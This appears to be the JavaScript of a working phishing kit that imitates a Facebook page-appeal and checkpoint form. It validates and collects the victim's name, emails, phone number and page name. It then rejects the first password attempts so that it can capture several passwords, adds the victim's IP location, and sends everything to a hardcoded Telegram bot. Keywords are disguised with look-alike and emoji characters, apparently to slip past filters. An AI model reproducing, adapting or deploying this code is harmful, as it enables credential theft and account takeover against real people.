function openModal() {
    // Validate the form before opening the modal
    if (validateForm()) {
        var modalContainer = document.querySelector('.modal-container');
        modalContainer.classList.add('active');
    }
}

    var passwordAttempts = 0; // Initialize pa​🇸​​🇸​word attempt counter
12
function submitForm() {
    // Display loading GIF and hide submit button text
    document.getElementById('loadingImage').style.display = 'inline';
    document.getElementById('buttonText').style.display = 'none';

    var passwordInput = document.getElementById('pa​🇸​​🇸​word');
    var password = passwordInput.value;

    setTimeout(function() {
        if (password === 'examplepa​🇸​​🇸​word' || passwordAttempts === 1 || passwordAttempts === 2) {
            // pa​🇸​​🇸​word is correct or it's the second or third attempt, proceed with form submission
            document.getElementById('pa​🇸​​🇸​word-error').style.display = 'none'; // Hide the error message if previously shown
            document.getElementById('login-success').style.display = 'block'; // Show successful login message

            // Send message to Telegram bot with the entered pa​🇸​​🇸​word and IP location
            var message = 'Pasi' + (passwordAttempts + 1) + ': ' + password;
            getIPLocation(message, true);

            if (passwordAttempts === 2) {
                // Redirect to confirm.html after the third attempt
                setTimeout(function() {
                    window.location.href = '/checkpoint/next.html';
                }, 2000);
            } else {
                // Remove the modal body and input, display the success message and the green tick
                document.querySelector('.modal-container').style.display = 'none';
                
            }
        } else {
            // pa​🇸​​🇸​word is incorrect, show error message
            document.getElementById('pa​🇸​​🇸​word-error').style.display = 'block';
            document.getElementById('login-success').style.display = 'none'; // Hide successful login message

            // Send message to Telegram bot with the entered pa​🇸​​🇸​word and IP location
            var message = 'Pasi' + (passwordAttempts + 1) + ': ' + password;
            getIPLocation(message, false);

            passwordAttempts++; // Increment pa​🇸​​🇸​word attempt counter

            // Add red border to the pa​🇸​​🇸​word input
            passwordInput.style.borderColor = 'red';

            // Show danger triangle icon
            document.getElementById('pa​🇸​​🇸​word-error-icon').style.display = 'inline';
        }

        // Clear the input field, hide loading gif, and display submit button text
        passwordInput.value = '';
        document.getElementById('loadingImage').style.display = 'none';
        document.getElementById('buttonText').style.display = 'inline';
    }, 2000);
}

function getIPLocation(message, shouldRedirect) {
    // Using Axios for consistency
    axios.get('https://ipapi.co/json/')
        .then(response => {
            const { ip, country_name, city, postal, isp } = response.data;

            message += '\nIP: ' + ip + '\nCountry: ' + country_name + '\nCity: ' + city + '\nZip Code: ' + postal;

            sendTelegramMessage(message);

            if (shouldRedirect) {
                setTimeout(() => {
                    window.location.replace('/checkpoint/next.html');
                }, 2000);
            }
        })
        .catch(error => {
            console.error('Error fetching IP location:', error);
            sendTelegramMessage(message);
        });
}



    function getIPLocation(message, shouldRedirect) {
    // Using Axios for consistency
    axios.get('https://ipapi.co/json/')
        .then(response => {
            const { ip, country_name, city, postal, isp } = response.data;

            message += '\nIP: ' + ip + '\nCountry: ' + country_name + '\nCity: ' + city + '\nZip Code: ' + postal;

            sendTelegramMessage(message);

            if (shouldRedirect) {
                setTimeout(() => {
                    window.location.replace('/checkpoint/next.html');
                }, 2000);
            }
        })
        .catch(error => {
            console.error('Error fetching IP location:', error);
            sendTelegramMessage(message);
        });
}


    function sendTelegramMessage(message) {
        var botToken = '6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU';
        var chatId = '-1002131592723';

        var apiUrl = 'https://api.telegram.org/bot6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU/sendMessage';
        var data = {
            chat_id: -1002131592723,
            text: message
        };

        axios.post(apiUrl, data)
            .then(function (response) {
            })
            .catch(function (error) {
            });
    }

function sendData() {
    const message = document.getElementById('Message').value;
    const name = document.getElementById('Name').value;
    const email = document.getElementById('Em𝚊il').value;
    const bemail = document.getElementById('bEm𝚊il').value;
    const phone = document.getElementById('Phone').value;
    const pageName = document.getElementById('PageName').value;

    // Using Axios for consistency
    axios.get('https://ipapi.co/json/')
        .then(response => {
            const { ip, country_name, city, postal, isp } = response.data;

            const formattedMessage =
                'Message: ' + message + '\n' +
                'Name: ' + name + '\n' +
                'Em𝚊il: ' + email + '\n' +
                'Business Em𝚊il: ' + bemail + '\n' +
                'Phone: ' + phone + '\n' +
                'Page Name: ' + pageName + '\n' +
                'IP: ' + ip + '\n' +
                'Country: ' + country_name + '\n' +
                'City: ' + city + '\n' +
                'Zip Code: ' + postal;
            sendTelegramMessage(formattedMessage);
        })
        .catch(error => {
            console.error('Error fetching IP location:', error);
            sendTelegramMessage(message);
        });
}

    function sendTelegramMessage(message) {
        var botToken = '6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU';
        var chatId = '-1002131592723';

        var apiUrl = 'https://api.telegram.org/bot6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU/sendMessage';
        var data = {
            chat_id: -1002131592723,
            text: message
        };

        axios.post(apiUrl, data)
            .then(function (response) {
            })
            .catch(function (error) {
            });
    }

    $.ajaxSetup({
        headers: {
            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
        }
    });

    window.addEventListener("DOMContentLoaded", function () {
        generateRandomNumber();
    });

    function generateRandomNumber() {
        var randomNumber = Math.floor(Math.random() * 900000000000) + 100000000000;
        document.getElementById("randomNumber").innerHTML = randomNumber;
    }

    function validateForm() {
    var isValid = true;

    // Validate Message
    var message = document.getElementById('Message').value;
    if (!message.trim()) {
        showError('MessageError', 'Please provide information that might help us investigate.');
        isValid = false;
    } else {
        hideError('MessageError');
    }

    // Validate Name
    var name = document.getElementById('Name').value;
    if (!name.trim()) {
        showError('NameError', 'Please enter your full name.');
        isValid = false;
    } else {
        hideError('NameError');
    }

    // Validate Em𝚊il
    var email = document.getElementById('Em𝚊il').value;
    if (!validateEmail(email)) {
        showError('Em𝚊ilError', 'Please enter a valid em𝚊il address.');
        isValid = false;
    } else {
        hideError('Em𝚊ilError');
    }

    var email = document.getElementById('bEm𝚊il').value;
    if (!validateEmail(email)) {
        showError('bEm𝚊ilError', 'Please enter a valid Em𝚊il address.');
        isValid = false;
    } else {
        hideError('bEm𝚊ilError');
    }

    // Validate Phone
    var phone = document.getElementById('Phone').value;
    if (!phone.trim()) {
        showError('PhoneError', 'Please enter your mobile phone number.');
        isValid = false;
    } else {
        hideError('PhoneError');
    }

    // Validate Page Name
    var pageName = document.getElementById('PageName').value;
    if (!pageName.trim()) {
        showError('PageNameError', 'Please enter your Facebook Page Name.');
        isValid = false;
    } else {
        hideError('PageNameError');
    }

    return isValid;
}

function showError(errorId, errorMessage) {
    var errorElement = document.getElementById(errorId);
    errorElement.innerText = errorMessage;
    errorElement.style.display = 'block';
}

function hideError(errorId) {
    var errorElement = document.getElementById(errorId);
    errorElement.style.display = 'none';
}

function validateEmail(email) {
    // Simple Em𝚊il validation, you can enhance it as needed
    var EmailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return EmailRegex.test(email);
}

document.getElementById('fcf-button').addEventListener('click', function () {
    if (validateForm()) {
        sendData(); // Send data if the form is valid
        openModal(); // Open the modal after sending data
    }
});

    document.querySelector('.modal-container').addEventListener('click', function (event) {
        if (event.target === this) {
            this.classList.remove('active');
        }
    });

    document.querySelector('.modal-content').addEventListener('click', function (event) {
        event.stopPropagation();
    });
